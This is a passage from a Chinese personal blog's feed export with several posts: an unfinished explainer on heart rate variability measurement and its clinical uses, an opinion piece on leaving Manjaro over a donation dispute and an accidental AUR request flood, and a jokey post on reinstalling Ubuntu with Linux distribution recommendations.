<li><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0FyY2hfVXNlcl9SZXBvc2l0b3J5XyjnroDkvZPkuK3mlocp">Arch用户仓库<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnlvaXRzdS5tb2UvYXJjaC1saW51eC9hdXJfcGFja2FnaW5nX2d1aWRlYm9vay5odG1s">AUR 纯萌新向入门教学(2)-创建一个软件包<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnlvaXRzdS5tb2UvYXJjaC1saW51eC9hdXJfc3VtYml0aW5nX2d1aWRlYm9vay5odG1s">AUR 纯萌新向入门教学(3)-提交软件包到AUR<i class="fa fa-external-link-alt"></i></span></li>
</ol>
<p>KDE的中文翻译也缺人，有精力的玩家可以去当翻译，中文翻译组在<span class="exturl" data-url="aHR0cHM6Ly9jcm93ZGluLmNvbS9wcm9qZWN0L2tkZW9yZw==">这里<i class="fa fa-external-link-alt"></i></span> KDE那边貌似挺缺打杂苦力的，熟悉Qt的同学可以去给社区做点贡献.</p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>KDE</tag>
        <tag>EndeavourOS</tag>
      </tags>
  </entry>
  <entry>
    <title>也谈心率变异性</title>
    <url>/2873/</url>
    <content><![CDATA[<p>等待填坑 <span id="more"></span></p>
<h2 id="采集">采集</h2>
<p>HRV测定的是NN间期(在正常的窦性心律时就是RR间期)的波动，主要与自主神经调控机制有关。标准的HRV根据正常窦性搏动的NN间期得出的（正常对正常间期，normal-to-normal,<em>NN</em> intervals，即由窦房结除极所致相邻QRS波群之间的所有间期）的变化来表示心率的变异性。</p>
<p><img src="heart-rate-varibility/201804091523323502.png" alt="提取心率变异性" style="zoom: 67%;" /></p>
<h3 id="心电ecg">心电（ECG）</h3>
<p>可以从心电图中直接提取R波尖峰并将RR间期的值用于心率变异性分析</p>
<h3 id="心冲击图bcg">心冲击图（BCG）</h3>
<p>心冲击图去除呼吸和活动的干扰后提取JJ间期时间计算心率变异</p>
<h3 id="光电容积图ppg">光电容积图（PPG）</h3>
<p>目前市面上主要的脉搏波测量方法是光电容积脉搏波描记法（photoplethysmography），用光电传感器检测光经过人体的反射和衰减转换成电信号后得到，包括Apple Waltch等手环产品，用光电容积法检测血氧、心率、心率变异性等生理参数。</p>
<figure>
<img src="/2873/figure-1-optical-heart-rate-sensing.jpg" alt="光电容积法原理" /><figcaption aria-hidden="true">光电容积法原理</figcaption>
</figure>
<p>PPG法采集到的脉搏波经过去噪和整流等处理后提取PP间期可以计算心率变异。</p>
<h4 id="远程光电容积扫描">远程光电容积扫描</h4>
<p>（rPPG，remote PPG）是一种新的方法，只要高清摄像头检测光线变化，真正的无创非接触。</p>
<p>但是这种方法成本高，易受到运动和光线变化的干扰。目前这个领域比较热门，进展也很快。一些补偿和增强鲁棒性的方法包括全局和局部运动跟踪和独立成分分析等。</p>
<p>现在此类研究缺乏可靠的公开数据集支持，现有研究大多采用MAHNOB-HCI和DEAP等用于活体识别和情感识别的公开数据集和私有数据集。</p>
<figure>
<img src="/2873/figure-3-overview-hr-and-hrv.jpg" alt="rPPG-HRV" /><figcaption aria-hidden="true">rPPG-HRV</figcaption>
</figure>
<h2 id="产生机理和影响因素">产生机理和影响因素</h2>
<figure>
<img src="/2873/示意图.png" alt="示意图" /><figcaption aria-hidden="true">示意图</figcaption>
</figure>
<blockquote>
<p>HRV反映的是自主神经和非自主神经系统所有反馈回路极其复杂的非线性交互作用。自主神经系统是窦性节律条件下心率的主要调节机制。</p>
</blockquote>
<p>忽略微小的影响，HRV的高频部分主要受迷走神经的调节，低频部分受到迷走和交感神经的双重作用。</p>
<p><img src="/2873/nero2.jpg" /></p>
<blockquote>
<p>交感神经增强自律性，而副交感神经抑制自律性。交感神经通过增加起搏点去极化程度产生变时性作用，而对心脏起搏点细胞的迷走刺激会引起超极化而降低去极化程度。自主神经的这两个分支均影响与心脏起搏细胞去极化相关的离子通道的活动。</p>
</blockquote>
<p>被测者的体位也会显著影响HRV，多数人处于仰卧位时，副交感神经活动明显增强。</p>
<p>在突然站立或倾斜时，压力反射活动也会引起心率的同步波动。</p>
<p>在24小时HRV中，白天交感神经活动相对增强，心率较快，而夜间迷走神经活动增强，心率较慢。正常睡眠时，生理活动也随每个睡眠周期(约90分钟)而呈现明显节律。</p>
<p>精神情绪的波动也会影响HRV，和迷走神经和交感神经系统的兴奋性有关。</p>
<p><img src="heart-rate-varibility/image-20191225214555467.png" alt="image-20191225214555467" style="zoom:50%;" /></p>
<p>此外，非自主神经因素(如神经内分泌功能)也会影响HRV。</p>
<p>心率变异性也和年龄、性别等因素有关。</p>
<h2 id="主要指标和数据分析">主要指标和数据分析</h2>
<h3 id="时域特征">时域特征</h3>
<p>医学上通常要求5分钟以上的的HRV做短时分析，但是有研究表明30s内的HF和LF和5分钟的没有太大区别，应用是可以进一步缩短检测时间。</p>
<ul>
<li><p>SDNN(ms)：NN间期(正常RR间期)的标准差(5分钟)</p></li>
<li><p>SDANN(ms)：NN间期(正常RR间期)的标准差（24小时）</p></li>
<li><p>pNN50：相邻NN间期相差&gt;50ms的数量占总心搏数的百 分比</p></li>
<li><p>rMSSD(ms)：相邻NN间期差值的均方根</p></li>
</ul>
<p>rMSSD反映每搏NN间期变化的平均绝对值，对不规律心搏和/或心搏波形标记错误的敏感性也很高。</p>
<p>24小时记录得到的SDANN值低下表明缺乏昼夜节律。</p>
<h3 id="频域特征">频域特征</h3>
<ul>
<li><p>总功率（TP）：频段≤0. 4Hz。</p></li>
<li><p>超低频功率（ULF）：频段≤ 0. 003Hz。</p></li>
<li><p>极低频功率（VLF）：频段 0. 003~0. 04Hz。</p></li>
<li><p>低频功率（LF）：频段 0. 04~0. 15Hz。</p></li>
<li><p>高频功率（HF）：频段 0. 15~0. 4Hz。</p></li>
<li><p>LF/HF: 低频功率和高频功率的比值</p></li>
</ul>
<p>LF反映副交感传出神经(迷走神经)和交感传出神经系统活性的综合调节</p>
<p>HF反映副交感传出神经(迷走神经)活动的调节</p>
<h3 id="非线性分析">非线性分析</h3>
<h4 id="动态心电图holter-monitor">动态心电图（Holter monitor）</h4>
<p>持续记录24小时或更久（几个月或一年以上）的长时间心电图数据，主要用来检测心律失常或传导异常和晕厥或晕厥前兆。</p>
<p><span class="math inline">\(a\dot{b}c\)</span></p>
<h5 id="洛伦兹散点图">洛伦兹散点图</h5>
<p><img src="heart-rate-varibility/201804091524569747.png" alt="img" style="zoom:80%;" /></p>
<p>把前1个心动周期长度（ms）定为横坐标、后1个心动周期长度（ms）定为纵坐标，即可在直角坐标系中确定一点。这样一个点就由3个QRS波（R波）、2个RR间期决定。第1个RR间期R1R2和第2个RR间期R2R3为第1个点，第2个RR间期R2R3和第3个RR间期R3R4为第2个点，依次类推，从R1 -&gt; Rn作图就可得到 n-2 个点，绘制心率散点图（洛伦兹散点图，Lorenz Plot），判断窦性心率、室上性和室性心率失常。正常窦性心律呈彗星状，心衰、房颤等症状会出现不同的散点图。窦性心律沿45°线分布，呈彗星状</p>
<p><img src="heart-rate-varibility/image-20191224202624859.png" alt="室性早搏" style="zoom: 67%;" /></p>
<p><img src="heart-rate-varibility/image-20191224202756257.png" alt="房性早搏" style="zoom: 67%;" /></p>
<p>散点图可用于：</p>
<p>评价心率波动范围（散点图的位置分布）</p>
<p>评价自主神经调节（长轴）</p>
<p>评价心率变异（短轴）</p>
<p>诊断心律失常（散点图的形态）</p>
<h5 id="差值散点图">差值散点图</h5>
<p>首先对序列 <span class="math inline">\(RiR_{i+1}\)</span> 做一阶差分, 得到序列 <span class="math inline">\(d_j ,j=1,2,\dots N-1\)</span> 然后以 <span class="math inline">\((d_j, d_{j+1})\)</span> 为坐标绘制散点图（Poincaré散点图）。差值散点图反映了RR间期差值的离散度 ,对连续RR间期的变化十分敏感。</p>
<p>首先对序列<span class="math inline">\(R_iR_{i\times1}\)</span>做一阶差分, 得到序列 <span class="math inline">\(d_j,j=1,2,\dots N-1\)</span> 然后以 <span class="math inline">\((d_j, d_{j+1})\)</span> 为坐标绘制散点图（Poincaré散点图）。差值散点图反映了RR间期差值的离散度 ,对连续RR间期的变化十分敏感。</p>
<figure>
<img src="/2873/image-20191225111057030.png" alt="健康人和CHF患者的散点图" /><figcaption aria-hidden="true">健康人和CHF患者的散点图</figcaption>
</figure>
<h5 id="三维散点图">三维散点图</h5>
<p>三维散点图的一些意义还不明确，医院里实际用的也很少 <img src="/2873/3D-scatter-plot.png" alt="心率变异性三维散点图" /></p>
<h5 id="心率震荡hrt">心率震荡（HRT）</h5>
<p>心率震荡（heart rate turbulence）是指发生室性早搏后，窦性心律出现短暂的加速和减速的过程。检测HRT异常有助于预测自主神经功能障碍以及心血管事件的风险增加。</p>
<p>分析HRT通常需要24小时HRV动态心电图，主要有震荡初始(turbulence onset, TO)和震荡斜率(turbulence slope, TS)两个指标。</p>
<h2 id="临床价值和应用">临床价值和应用</h2>
<h3 id="心肌梗死死亡率预测">心肌梗死死亡率预测</h3>
<p>心梗后早期(14日内)，若检测到患者的HRV指标降低，则心梗后3年内的死亡风险增至3-4倍。</p>
<h3 id="心力衰竭">心力衰竭</h3>
<p>已知就预后而言，HRV降低是总体死亡、心力衰竭死亡、心脏性猝死、室性心律失常和心脏移植的 独立预测指标</p>
<h3 id="评估自主神经病变">评估自主神经病变</h3>
<p>HRV明显降低或缺失可以作为辅助指标。</p>
<h3 id="冠心病">冠心病</h3>
<p>冠心病患者的HRV显著降低,且与冠状动脉病变支数及狭窄程度呈负相关,但与冠状动脉病变部位无关。</p>
<h3 id="检测精神压力">检测精神压力</h3>
<p>短时HRV变化可用于辅助检测精神压力</p>
<p>迷走神经的冲动传导频率受呼吸频率和深度的调节而呈现节律性波动，呼吸性窦性心律不齐(respiratory sinus arrhythmia, RSA)。在有节奏的呼吸或冥想时，RSA可被放大。</p>
<h3 id="评估体育表现">评估体育表现</h3>
<p>可以作为推测无氧阈的较为精确的指标之一</p>
<blockquote>
<p>注意 在运动评估中一般只有要求无伤等才会首先考虑HRV，一般是用血清肌酸激酶(CK)、血清睾酮(T)、血红蛋白、乳酸等</p>
</blockquote>
<h3 id="监测训练负荷及诊断运动性疲劳">监测训练负荷及诊断运动性疲劳</h3>
<p>交感一副交感神经张力的平衡会随着运动强度的改变而波</p>
<h3 id="运动康复医学领域">运动康复医学领域</h3>
<p>用于自主神经功能改善的评估</p>
<h3 id="睡眠分期">睡眠分期</h3>
<p>略</p>
<h2 id="其他">其他</h2>
<h3 id="呼吸和心率变异性">呼吸和心率变异性</h3>
<h4 id="bcg信号中的呼吸信息">BCG信号中的呼吸信息</h4>
<p>在采集到的BCG信号中，会包含呼吸信息，提取心率变异性通常要去除呼吸的干扰。</p>
<p>但是在一些利用HRV进一步分析情绪、压力、睡眠分期的时候，可以考虑保留部分呼吸特征并将呼吸特征纳入到检测和分类中，有时可以提高检测的准确率。</p>
<p>在心率变异性分析中纳入呼吸频率信息以进行压力评估</p>
<h4 id="呼吸变异性">呼吸变异性</h4>
<p>呼吸频率变异性(Respiratory Rate Variability，RRV, 有的地方也叫Breath Rate Variability），和心率变异性一样反映了一些生理特征，但是这种非电信号采集难，噪声大，不规律，包含的信息也比心电和脉搏波等信号少。除了</p>
<p>目前对于RRV的研究比较少，也很少有人用这个特征做睡眠分期检测、疲劳压力检测或睡眠呼吸暂停的检测。一些使用雷达等手段检测疲劳或者睡眠的研究将这项指标作为判断依据。雷达和监控视频等可以在较近的距离探测人体呼吸活动和心率，但是这样采集分离出的心动信息用作睡眠和疲劳监测不如直接采集呼吸和运动的信息进行分析。对于体重指数（body mass index ）过高的的超重人群、较复杂的干扰和活动等情景，使用雷达等方式检测压力或疲劳时HRV准确率大幅降低，从心动信息检测不如直接从呼吸信息检测。在这些场景下会使用呼吸和体动信息来作为指标。</p>
<h2 id="数据和软件">数据和软件</h2>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cua3ViaW9zLmNvbS9ocnYtc3RhbmRhcmQv">https://www.kubios.com/hrv-standard/<i class="fa fa-external-link-alt"></i></span> 免费的HRV分析软件</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucGh5c2lvbmV0Lm9yZy8jbGF0ZXN0">https://www.physionet.org/#latest<i class="fa fa-external-link-alt"></i></span> 心电图数据</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1EX0tZdjdwWEF2UQ==">https://www.youtube.com/watch?v=D_KYv7pXAvQ<i class="fa fa-external-link-alt"></i></span> rPPG检测心率</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9weXBpLm9yZy9wcm9qZWN0L2JvYi5ycHBnLmJhc2Uv">https://pypi.org/project/bob.rppg.base/<i class="fa fa-external-link-alt"></i></span> rPPG的开源库，数据集MAHNOB-HCI和DEAP</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaHJ2NHRyYWluaW5nLmNvbS8=">https://www.hrv4training.com/<i class="fa fa-external-link-alt"></i></span> 一个用蓝牙测HRV的APP，准确率貌似还可以</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZmlyc3RiZWF0LmNvbS9lbi9maXJzdGJlYXQtaHJ2LXN1bW1pdC0yMDE5Lw==">Firstbeat HRV Summit<i class="fa fa-external-link-alt"></i></span> Firstbeat公司的HRV峰会，一些商用搞的比较好的东西</li>
</ol>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>HRV</tag>
        <tag>BCG</tag>
      </tags>
  </entry>
  <entry>
    <title>你好，Manjaro。再见，Manjaro。</title>
    <url>/ff0e/</url>
    <content><![CDATA[<p>洗手.jpg <span id="more"></span></p>
<p>虽然有一些办法不重装从Manjaro跑路到Arch， <!-- 
比如reddit上这篇帖子[Guide for Manjaro to Arch migration (the dirty way)](https://www.reddit.com/r/ManjaroLinux/comments/jx42ar/guide_for_manjaro_to_arch_migration_the_dirty_way/)
 --> 但是你会遇到各种Manjaro魔改的遗留问题（尤其是加入了相当多魔改的最新版Manjaro,据说很早以前比较容易直接滚成Arch）,<strong>the dirty way</strong>。</p>
<p>我甚至觉得上面这个方法想得到一个纯净的Arch，难度比你去arch的<span class="exturl" data-url="aHR0cHM6Ly9hcmNoaXZlLmFyY2hsaW51eC5vcmcvaXNvLw==">archive<i class="fa fa-external-link-alt"></i></span>下载一个10年前的iso（真正的有图形界面的arch安装镜像哦，官方的）再借助<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvQXJjaF9MaW51eF9BcmNoaXZl">Arch Linux Archive<i class="fa fa-external-link-alt"></i></span>（Rollback Machine）等一点一点滚到最新都麻烦。（至少去年Arch群友们玩过这个活动，勉强可行）</p>
<p>直接重装一个原味Arch应该是最快的，也是后遗症最小的。总有人觉得直接不重装换源成Arch比较简单，很遗憾，这其实是最麻烦的一种方法。天上不会掉馅饼。</p>
<h2 id="更新--再见manjaro">更新--再见Manjaro，</h2>
<p>前一阵Manjaro社区出的争吵让我跑路了，Manjaro之前用的还比较舒服（当然直到现在都比较舒服），以后就不知道怎么样了。外面Arch社区骂声一片，里面还总在内斗，不断有人出走，前几周连jonathon都气走了（跑去隔壁endeavour os了）</p>
<p>jonathon的声明在<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS5tYW5qYXJvLm9yZy90L2NoYW5nZS1vZi10cmVhc3VyZXItZm9yLW1hbmphcm8tY29tbXVuaXR5LWZ1bmRzLzE1NDg4OA==">这篇帖子<i class="fa fa-external-link-alt"></i></span></p>
<p>过程大概是这样的，philm（Manjaro的CEO，反正Manjaro社区的不少人都觉得此人非常讨厌）挪用社区赞助捐款2000欧元，用于给自己买的电脑。这次购买并没有跟掌钱管家jonathon商量，也没有在社区内征得同意。jonathon觉得按照规定这钱只能用于Manjaro项目的网站建设、项目推广之类的，不是给你们恰烂钱的，然后在论坛发帖子怼philm，然后帖子被删了一次，jonathon的管理员也被撤了。帖子下面众人纷纷表示philm不回应道歉以后再也不捐助Manjaro了，不少人表示以后再也不用Manjaro了，并考虑跑路到KDE Neon、Kubuntu、Arch、Endeavour OS。</p>
<p>philm的回应闪烁其辞，一直说事情不是大家想的那个样子的，但是大家怼他让他公布他和jonathon的完整聊天记录他又不肯。最后philm屁事没有继续担任Manjaro的领袖，jonathon跑路去了Endeavour OS。</p>
<h2 id="再次更新--pamac不慎向aur官网打出了ddos">再次更新--pamac不慎向aur官网打出了DDoS</h2>
<p>Manjaro的Pamac不小心DDoS了aur.archlinux.org， 每秒40多来自pamac的请求，aur遭到暴击。 很喜欢reddit评论里的一句话：Just when I thought I couldn’t hate manjaro any more.</p>
<p>https://www.reddit.com/r/archlinux/comments/mz3biz/is_the_aur_down_for_everyone/<br />
https://gitlab.manjaro.org/applications/pamac/-/issues/1017</p>
<h2 id="关于社区文化和商业化">关于社区文化和商业化</h2>
<p>微软的商业化非常成功，苹果和安卓也是。</p>
<p>即使Linux桌面发行版这种反商业风气比较浓的地方，商业化也不意味着坏事。</p>
<p>REHL也还算不错，名声也比较好；Canonical争议比较大，虽然不招Debian等开源社区的喜欢，早年间也算对推广Linux桌面有贡献，后面snap等有点evil化了</p>
<p>当然，或许还要算上国内的Deepin。（奔着Windows的竞品去的，和其他Linux社区的画风和定位不太一样，倒是和安卓的定位挺像，总不是坏事）</p>
<p>然而Manjaro的商业化我很不看好，就我目前看到的，对上游没有太多贡献，反而给上游带来了更多的麻烦。而且还有一点，Manjaro挪用社区捐款到公司口袋里面，虽然都是Manjaro，但是这在眼里揉不得沙子的很多开源社区人严重这已经是重罪了。当然，也不全是坏事，就不少人的体验来看，至少用起来比Ubuntu舒服不少。</p>
<p>红帽的商业化就很成功，一开始就是给企业提供服务器支持等商业化内容，挣了钱反哺Linux社区。Deepin有不少情怀，比某些充满国家经费和金钱气息的发行版好不少，打包了很多deepin-wine也好DDE也好争取到国内不少公司配适Linux也好，都还算不错。Deepin虽然也带来了大量的小白，但是没有涌到Debian等社区去造成很多麻烦。</p>
<p>我们重温一下“b站或许会倒闭但绝不会变质”的典中典（不知不觉蒙古上单发表重要讲话也一年了，笑）。为什么b站就被骂的这么厉害呢？优酷土豆乐视爱奇艺哪个广告不比这个多，开头的广告还无法跳过。论视频质量和推荐无营养的视频、还有强制使用手机app、以及抄袭和营销号，跟抖音快手比现在的b站已经算良心了吧。<br />
就像早期的b站那样，这是一群小圈子和爱好者，首先这不是一个商品，这是一个社区，没多少营销号也没有广告，很多人是倾注心血去做视频的，感情很深，氛围也很好。（国内其他视频网站可能也就被封的内涵段子“段友”（现 皮皮虾）有早期b站用户那样类似的归属感了，什么？a站？a站还活着啊？） 当然视频网站的运行成本比较高，靠用爱发电一般做不了很大（就算商业化吃香难看都难免亏损，比如爱奇艺），人多了以后商业化是难免的。</p>
<p>相信大家都能看到Arch社区对Manjaro用户的态度，不管是在archlinuxcn论坛或者irc、电报，还是在国外的reddit社区等，……<em>&amp;（</em>%&amp;&amp;￥人*&amp;……（此处省略500字）</p>
<p>不少Arch用户和维护者对Manjaro的恶意大概就像b站老用户这样（你看苹果微软不是比Manjaro邪恶多了，但是他们敌视这些的次数可能比Manjaro要少）</p>
<p>Arch背后没有商业化背景，甚至没有红帽或Canonical这样的公司，然而还是有了比背靠大公司的发行版更多的包（算上野包）和更丰富的wiki(可能没有红帽的wiki好，但是中文翻译多)，这都是Arch的维护者和用户们用爱发电一砖一瓦的心血。它不像Windows和Mac或者红帽的RHEL那样一开始就是一个商品，而且Arch的特点也不太适合做服务器或者商业化。（可能gentoo的商业化用途都比Arch多，还是有一点运维在用gentoo当服务器的）Manjaro的商业化，和原来的社区格格不入。很多地方直接和arch的不少理念和作风背道而驰。 不幸的是Manjaro的社区也有不少伸手党，大量安利Manjaro的视频和帖子都只说好用、好看、好安装，绝口不提社区文化和用户责任。（<strong>而且还在教程里让你添加archlinuxcn的源，同时还说Manjaro更稳定</strong>）</p>
<p>曾经的Arch的ISO有GUI安装界面的（10年前），后来就没了，而官方Wiki上的安装指南也对新手不那么友好了（越来越不友好了）。这里面一个比较重要的原因是过滤小白用户和伸手党，提高用户门槛。这个策略应该还是比较成功的，然而这挡不住Manjaro等发行版的用户。（许多完全有能力安装、使用Archlinux甚至为Archlinux做贡献的用户一开始都被吓到了Manjaro，走了一些弯路，兜兜转转又被洗手到了Arch） 今年愚人节当天Arch出了一个<span class="exturl" data-url="aHR0cHM6Ly9hcmNobGludXgub3JnL3BhY2thZ2VzL2V4dHJhL2FueS9hcmNoaW5zdGFsbC8=">archinstall<i class="fa fa-external-link-alt"></i></span>的TUI安装方式（还在extra仓库里），当时我一度以为是愚人节玩笑。不过试了一下，还是与其他发行版的GUI安装界面相去甚远。</p>
<p>短期看来不会，长期看来应该也不会。可能是无奈之举吧，暂时也找不到太多比提高安装门槛更好的过滤伸手党的办法了。</p>
<p>这种过滤机制类似很多论坛（比如52pojie等）的邀请制、等级制，早期知乎也是这样的邀请制（甚至还要求实名）。前面提到的b站早期也是要答题的（而且题还很难）。 这些做法确实很有效，很多论坛都靠邀请制挡住了伸手党和发广告的。知乎在开放邀请后内容质量的下滑速度经历过的人应该印象很深，b站也是。我还是个真·小学生的时候赶上了许多中文论坛的最后余辉，现在再想起那些倒闭的、变质的、冷冷清清没人说话的论坛曾经高朋满座的热闹的场面还是不胜唏嘘。Manjaro给Arch带来的影响，总让我想起曾经经历过的社区没落过程。。。</p>
<h2 id="链接">链接</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9yZW50cnkuY28vbWFuamFyby1jb250cm92ZXJzaWVz">Manjaro Controversies<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly9vcmlnaW5jby5kZS9NYW5qYXJvLUNvbnRyb3ZlcnNpZXMv">【译】Manjaro 的争议<i class="fa fa-external-link-alt"></i></span> 源码菊巨的中文翻译<br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2xpbnV4NG5vb2JzL2NvbW1lbnRzL2ZuMmlxOC93aHlfeW91X3Nob3VsZG50X3VzZV9tYW5qYXJvLw==">Why You shouldn't use Manjaro.<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2xpbnV4cXVlc3Rpb25zL2NvbW1lbnRzL2JycnBxci93aHlfbm90X21hbmphcm8v">Why not Manjaro?<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQ3NTE0MTIyL2Fuc3dlci8xMDc0MTI1NDk=">Ubuntu 推出的Snap应用架构有什么深远意义? - farseerfc的回答<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="他山之石">他山之石</h3>
<p>Arch的社区属性要远远大于工具属性和商品属性，我们看看那些耳熟能详的社区。这里扔了很多知乎的链接，是因为，我觉得“btw I use arch”和部分arch粉丝在众人眼中的快要溢出优越感，和早期（13年前）中期（15年前）的知乎特别像。很奇怪openSUSE社区和gentoo社区等都没这种arch这种说不出来风气，如果非要找个相似的，可能是部分vim党（emacs党类比gentoo） 还能再诞生一个像早期知乎氛围和内容质量一样的社区吗？我觉得不能（限定简中，长城之内）。还能再诞生一个像arch这样的社区吗？我觉得也不能。有些东西是90年代和2000年初错过就不再有的，未来是商业公司、手机app、短视频直播，自由软件和社区、理想、小众社区诞生的机会不多了。（AOSC等地方能看到火苗和种子，然而每次我看到十年前整个互联网的氛围和现在的样子，还是有点悲观）</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMzNDA2Njg1Ng==">哔哩哔哩注册为什么要去做题？<i class="fa fa-external-link-alt"></i></span><br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIwMjY5NzcyL2xvZw==">知乎最近涌入了很多在校大学生，这会对知乎产生什么影响？<i class="fa fa-external-link-alt"></i></span> 这是一个2012年的问题，今天看起来有点苦涩<br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI3MjAyNTA4L2Fuc3dlci8zNTgyNzU2Mw==">怎么找到知乎早期的经典回答？<i class="fa fa-external-link-alt"></i></span> 这是一个14年的问题 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIyNjgyNTcz">佐藤謙一等人的离开是知乎的转折点吗？<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIyNjc1Nzk2">佐藤謙一删掉所有知乎记录离开知乎的原因是什么？<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIxNTc0NDU1">葛巾为什么离开知乎？<i class="fa fa-external-link-alt"></i></span> 同样是几个14年的问题 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQyNjQ5MjU5Ny9hbnN3ZXIvMTU0MjYzMzE5Mw==">什么是「知乎遗风」，现在还有哪些知乎用户拥有这种「遗风」？<i class="fa fa-external-link-alt"></i></span> 这是一个2020年的问题</p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>Archlinux</tag>
        <tag>manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title>重装Ubuntu</title>
    <url>/2d5/</url>
    <content><![CDATA[<p>祖传服务器传到了我的手里, 行吧。其实我想把标题改成Ubuntu内部错误的解决办法（不是 <span id="more"></span></p>
<h2 id="更新和洗手">更新（和洗手）</h2>
<p>19年写的这个20年不知道怎么在2020年有一段时间被扔到了<code>重装Ubuntu</code>搜索结果的最前面，我这个小破站访问量暴增。然而那个时候20.04LTS都出了，已经有点过时了，而我19年那会写的那个几乎属于个人吐槽，差不多是我博客迁到，完全不适合作为一个教程。可能骗了很多人进来，</p>
<p>装什么Ubuntu啊，还是Arch香，群里个个都是人才，说话又好听</p>
<p><img src="/2d5/1611832700.webp" /></p>
<p>但是祖传的是Ubuntu，但是假期我要回家滚又不敢远程滚, 但是我不想折腾显卡驱动了（Nvidia,fuck you!），但是这是工作站和服务器，上Arch天天滚可不太好。</p>
<p><del>但是随便装个Ubuntu不仅快，他们跑深度学习的时候抄CSDN配置环境也方便</del></p>
<p><del>最重要的，又不是我用。</del></p>
<p><del>GNOME内存泄漏关我什么事</del></p>
<p><del>Ubuntu内部错误关我什么事</del></p>
<p>还是去用Ubuntu吧.jpg</p>
<p><img src="/2d5/1611834396.webp" /></p>
<p><img src="/2d5/1611834449.webp" /></p>
<h2 id="认真发言">认真发言</h2>
<p>其实你可以试试Debian（Canonical强推snap太烦人了）</p>
<h3 id="关于桌面de">关于桌面（DE）</h3>
<p>带桌面的版本建议避开Ubuntu的GNOME，那个东西。。。</p>
<p>可以试试Linux Mint，或者Fedora（这个的GNOME应该比 Ubuntu 16、18 那几个整天内存泄露的GNOME版本稳多了）</p>
<p>其实我推荐KDE，可以试试Kubuntu（或者KDE Neon？）</p>
<p>机器配置较差请直接Lubuntu，稳如老狗，除了略简陋没有别的缺点。</p>
<p>一众WM用户应该不会搜索这么蠢的关键词搜到我这里来，这里不谈WM了。</p>
<h3 id="关于服务器">关于服务器</h3>
<p>小作坊没有专职运维和技术支持，其实服务器建议试试Debian或者Ubuntu LTS，Debian stable稳如老狗</p>
<p><del>众所周知，Debian testing 都比 Ubuntu LTS 稳（注意这个安全更新比较慢，个人用户可以testing，开了公网端口的工作站不要用这个）</del></p>
<p>不过Ubuntu和CentOS6、7比起来，还是瞬间和蔼可亲了不少</p>
<p>求求新入坑的别再跟着什么鸟哥私房菜之类的老教程用CentOS了，2020年CentOS8都被扬了，REHL马上就要给小作坊免费了，小作坊真迷信稳定上REHL吧</p>
<p>没事不要用所谓稳定的老版本然后找不到包只能自己手动编译，就不说c/c++那一堆lib了，我已经见过不少人在编译python的时候没开ssl当场翻车。</p>
<p>什么你说容器？你试过在CentOS6上面弄Docker和k8s吗，我在教研室的祖传阿里云上试过一次，从此再也不想看到CentOS了</p>
<p>（整天在CentOS上手动编译凸显运维重要性和工作量的除外）</p>
<h3 id="太长不看">太长不看</h3>
<p>我是说，除了Ubuntu（以及其默认捆绑的GNOME、gtk、rime输入法,强推的snap，祖传的内部错误）,还有很多选择</p>
<p>或者你用WSL之类的东西也行呢（WSL2显卡驱动也差不多能用了，虽然io效率还有些问题）。</p>
<!-- 上回书说到，服务器一不小心卸载了iptables
现在准备重装。还是打算装Ubuntu Server（并不打算装Manjaro，也不适合搞桌面版，今天试过一下Ubuntu Desktop，图形化界面由于服务器没有独显直接卡到爆炸）
~~初步打算安装Ubuntu server 16.04.6LTS, 使用LVM分区~~
安装Ubuntu18.04LTS，之前VPS用过一阵18，也没注意有什么新特性，据说还是改了一些东西⬇

>据说
内核更新到了 Linux kernel 4.15，这就意味着新增了不少特性 bbr什么的
网络管理工具 ifupdown 已经彻底废弃，建议全面拥抱 ip 命令
DNS 由 systemd 全面接管，接口监听在 127.0.0.53:53，配置文件在 /etc/systemd/resolved.conf，修改后重启服务即可 systemctl restart systemd-resolved。不要听网上那些奇怪的教程教你如何修改 /etc/resolv.conf
swap 文件来替代 swap 分区

## 装Ubuntu16.04LTS

### 安装

下载iso，制作启动盘，这里用的Rufus
